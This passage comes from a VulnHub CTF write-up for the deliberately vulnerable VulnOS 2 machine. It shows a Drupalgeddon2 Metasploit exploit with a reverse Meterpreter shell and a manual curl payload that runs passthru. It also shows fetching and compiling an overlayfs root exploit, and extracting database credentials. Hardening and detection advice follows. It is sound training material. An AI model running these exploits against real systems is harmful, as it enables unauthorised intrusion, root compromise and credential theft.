Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)     | php/webapps/44482.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                     | php/webapps/44448.py
----------------------------------------------------------------------------------------------------- ---------------------------------
```

**Metasploit:**

```bash
msfconsole -q
```

```bash
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 192.168.56.104
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set TARGETURI /jabc/
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set LHOST 192.168.56.10
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > check
[*] 192.168.56.104:80 - The target is vulnerable.
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Sending stage (39927 bytes) to 192.168.56.104
[*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.104:33112)

meterpreter > getuid
Server username: www-data (33)
meterpreter > sysinfo
Computer    : VulnOSv2
OS          : Linux VulnOSv2 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:08:14 UTC 2014 i686
Meterpreter : php/linux
```

> **`set TARGETURI /jabc/`** is essential — Drupal is not at the site root here.
> **Always run `check` first**: the module can verify the vulnerability without
> firing.
>
> `www-data` (UID 33) is Debian/Ubuntu's web-server user. From here:
> ```bash
> meterpreter > shell
> Process 3921 created.
> python -c 'import pty; pty.spawn("/bin/bash")'
> www-data@VulnOSv2:/var/www/jabc$ cd /tmp && wget http://192.168.56.10:8000/ofs.c
> www-data@VulnOSv2:/tmp$ gcc -o ofs ofs.c && ./ofs
> # id
> uid=0(root) gid=0(root) groups=0(root),33(www-data)
> ```
> Same kernel, same overlayfs exploit, same root.

**Manual PoC (understand the payload):**

```bash
curl -s -X POST 'http://192.168.56.104/jabc/?q=user/password' \
  --data 'form_id=user_pass&_triggering_element_name=name' \
  --data 'name[#post_render][]=passthru&name[#markup]=id&name[#type]=markup'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Read that payload.** Three parameters smuggle Drupal render directives:
> - `name[#type]=markup` → make this element a *markup* element.
> - `name[#markup]=id` → the markup content is the string `id`.
> - `name[#post_render][]=passthru` → after rendering, call `passthru()` on it.
>
> So Drupal does `passthru('id')`. `passthru()` is PHP's "run this shell command and
> print the raw output" function. The `_triggering_element_name=name` and
> `form_id=user_pass` parameters steer Drupal into rendering the *password reset*
> form, which requires no authentication.
>
> **The generic lesson:** any framework that lets user input control *how* data is
> processed — not just *what* data is — is one bad key prefix away from RCE. This is
> the same class as Java deserialisation (Struts2, Log4Shell) and PHP's
> `unserialize()`.

![Drupalgeddon2 Meterpreter session](images/06-drupal.png)

### 6.4 Reading the Drupal config for MySQL creds (from `www-data`)

```bash
www-data@VulnOSv2:/var/www/jabc$ cat sites/default/settings.php | grep -A6 'databases'
```

```php
$databases = array (
  'default' =>
  array (
    'default' =>
    array (
      'database' => 'drupaldb',
      'username' => 'drupaluser',
      'password' => 'CQHDy28z7UKJbj442Qbjwfgh5pK8WrT',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

> **`settings.php` is Drupal's crown jewels.** Anyone with `www-data` read access
> gets full database credentials. Dump the users table and you have Drupal admin
> passwords (hashed):
> ```bash
> mysql -u drupaluser -p'CQHDy28z7UKJbj442Qbjwfgh5pK8WrT' -e \
>   'SELECT uid,name,pass,mail FROM drupaldb.users;'
> ```

---

## 7. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Verbose server banners (`X-Generator`, `X-Powered-By`, SSH version) | Apache/Drupal/PHP/OpenSSH | Exact version disclosure |
| 2 | `CHANGELOG.txt` web-readable | `/jabc/CHANGELOG.txt` | Exact Drupal version (7.41) |
| 3 | **Demo credentials advertised on the login page** (`guest:guest`) | OpenDocMan at `/jabcd0cs/` | Authenticated reconnaissance |
| 4 | **Unauthenticated SQL injection — CVE-2014-1945** | OpenDocMan 1.2.7, `ajax_udf.php?add_value=` | Full database disclosure |
| 5 | **Unsalted MD5 password storage** | `jabcd0cs.odm_user.password` | Admin password recovered in seconds |
| 6 | **Credential reuse: web app password = SSH password** | `webmin` / `webmin1980` | Remote system foothold |
| 7 | **Unpatched kernel — CVE-2015-1328 (overlayfs)** | Linux 3.13.0-24-generic | `webmin` → **root** |
| 8 | `gcc`/`wget` present on a server | `/usr/bin` | Attackers can compile and stage exploits locally |
| 9 | Drupal 7.41 unpatched (CVE-2018-7600 Drupalgeddon2) | `/jabc/` | Unauthenticated RCE as `www-data` (alternate path) |
| 10 | Database credentials in a web-readable config | `/jabc/sites/default/settings.php` | Full DB compromise from any web foothold |
| 11 | Unused ngIRCd exposed on :6667 | ngircd | Attack surface with no business purpose (rabbit hole) |
| 12 | 1024-bit DSA SSH host key | sshd | Weak key, rejected by modern clients |

## 8. Defensive lessons (blue team)

1. **Patch, patch, patch.** Three of the findings here (Drupalgeddon2, OpenDocMan
   SQLi, overlayfs) were all *publicly patched* long before they mattered. Subscribe
   to vendor security feeds, enable unattended-upgrades for security pockets:
   ```bash
   sudo apt install unattended-upgrades
   sudo dpkg-reconfigure -plow unattended-upgrades
   ```
2. **Parameterised queries everywhere.** The OpenDocMan bug is one line of code. In
   PHP use PDO prepared statements:
   ```php
   $stmt = $pdo->prepare('SELECT id FROM odm_data WHERE id = :q');
   $stmt->execute([':q' => $_GET['q']]);
   ```
3. **Never store unsalted MD5.** Use `password_hash($pw, PASSWORD_ARGON2ID)` and
   `password_verify()`. If you inherit MD5 hashes, force a reset on first login.
4. **Never ship demo credentials.** Remove `guest/guest` from production builds, or
   at minimum disable the account. Advertised demo credentials on an internet-facing
   login page are an open door.
5. **Strip identifying headers:**
   ```apache
   ServerTokens Prod
   ServerSignature Off
   Header unset X-Powered-By
   ```
   ```php
   ; php.ini
   expose_php = Off
   ```
   And deny access to `CHANGELOG.txt`, `INSTALL.txt`, `.git/`, `composer.json`.
6. **No credential reuse between systems.** The web application password must never
   also be a system password. Enforce with `pam_cracklib`/`pam_pwquality`
   (`dictcheck`, `usercheck`) and a breached-password check.
7. **Run databases as dedicated unprivileged users**, bind them to loopback (this box
   *did* do that — good), and tunnel-proof them with strong, unique passwords. Also
   `secure_file_priv` and no `FILE` privilege for app accounts.
8. **Remove build tools from production.** `gcc`, `make`, `wget` and `curl` on a web
   server turn "foothold" into "root in 60 seconds". Use a minimal base image and
   install compilers only in build stages.
9. **Restrict user namespaces** if you do not need unprivileged containers:
   ```text
   kernel.unprivileged_userns_clone = 0
   user.max_user_namespaces = 0
   ```
10. **Do not run unused services.** ngIRCd on 6667 had one user, zero channels, no
    purpose. Every listening socket is attack surface. `systemctl disable --now ngircd`.
11. **Detection opportunities.**
    - Web WAF/log rule for `ajax_udf.php` with `UNION`/`SELECT`/`load_file`/`SLEEP(`
      in the query string.
    - Drupalgeddon2 signature: POSTs to `?q=user/password` or `?q=user/register`
      containing `#post_render`, `#lazy_builder` or `#markup`.
    - auditd on `/etc/ld.so.preload`:
      `-w /etc/ld.so.preload -p wa -k ldpreload`
    - Alert on `gcc`/`cc1` execution by a service account (`www-data`, `webmin`).
    - SSH: alert when a web application's DB user suddenly authenticates
      interactively.

---

## 9. References

- VulnHub entry: <https://vulnhub.com/entry/vulnos-2,147/>
- Series: <https://vulnhub.com/series/vulnos,180/>
- Community writeups consulted:
  - [d4rc0d3x — Writeup of VulnOSv2 VM (OpenDocMan SQLi path)](https://github.com/d4rc0d3x/ctfs/tree/master/writeups/vulnhub/VulnOSv2)
  - [joenibe — Vulnhub VulnOS 2 Writeup (Drupalgeddon2 + overlayfs)](https://joenibe.github.io/vulnhub/vulnosv2/)
  - [xenjaya — VulnOS: 2 Walkthrough (PostgreSQL tunnelling path)](https://www.xenjaya.com/vulnos-2-walkthrough/)
  - [diesec — Writeup VulnOS: 2 (kill-chain summary)](https://diesec.home.blog/2020-03-15/writeup-vulnos-2/)
  - [arisarisyi — VulnOS v2 VulnHub Walkthrough](https://medium.com/@arisarisyi/vulnos-v2-vulnhub-walkthrough-2277e648e741)
  - [sms2thamb — Vulnhub: VulnOS 2 Walkthrough](https://medium.com/@sms2thamb/vulnhub-vulnos-2-e0f840f94b3f)
  - [3xocyte — VulnOS 2 Walkthrough (clean)](https://pastebin.com/TTLLK9A0)
  - [nagatodeptrai — VulnOS: 2](https://medium.com/@nagatodeptrai/vulnos-2-246c9450994e)
  - [erictee2012 — VulnOS 2 Writeup and Walkthrough](https://medium.com/@erictee2012/vulnos-2-writeup-and-walkthough-vulnhub-749973f4dc7)
  - [g0blin — VulnHub VulnOS 2 Solution Writeup](https://g0blin.co.uk/vulnos-2/)
- Exploits / advisories:
  - [CVE-2014-1945 — OpenDocMan 1.2.7 SQL Injection](https://nvd.nist.gov/vuln/detail/CVE-2014-1945) · [Exploit-DB 32075](https://www.exploit-db.com/exploits/32075) · [Exploit-DB 34993](https://www.exploit-db.com/exploits/34993)
  - [CVE-2018-7600 — Drupalgeddon2](https://nvd.nist.gov/vuln/detail/CVE-2018-7600) · [Drupal SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
  - [Exploit-DB 44449 / 44448 — Drupalgeddon2 PoCs](https://www.exploit-db.com/exploits/44449)
  - [CVE-2015-1328 — Ubuntu overlayfs LPE](https://nvd.nist.gov/vuln/detail/CVE-2015-1328) · [Exploit-DB 37292](https://www.exploit-db.com/exploits/37292)
  - [Ubuntu USN-2641-1](https://ubuntu.com/security/notices/USN-2641-1)
  - [Rapid7 — drupal_drupalgeddon2 module](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)
- Background reading:
  - [sqlmap user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
  - [hashcat mode reference](https://hashcat.net/wiki/doku.php?id=example_hashes)
  - [OverlayFS kernel documentation](https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt)
  - [Drupal render arrays and the Form API](https://www.drupal.org/docs/drupal-apis/render-api/render-arrays)
  - [GTFOBins](https://gtfobins.github.io) · [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

---

## 10. Screenshot checklist

- [ ] `images/01-opendocman.png` — the `/jabcd0cs/` OpenDocMan login (guest/guest)
- [ ] `images/02-sqlmap.png` — `sqlmap` dumping `odm_user`
- [ ] `images/03-ssh.png` — SSH login as `webmin` and the `uname -a` output
- [ ] `images/04-root.png` — overlayfs exploit → `uid=0(root)`
- [ ] `images/05-flag.png` — `/root/flag.txt`
- [ ] `images/06-drupal.png` — Drupalgeddon2 Meterpreter session (alternate path)

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
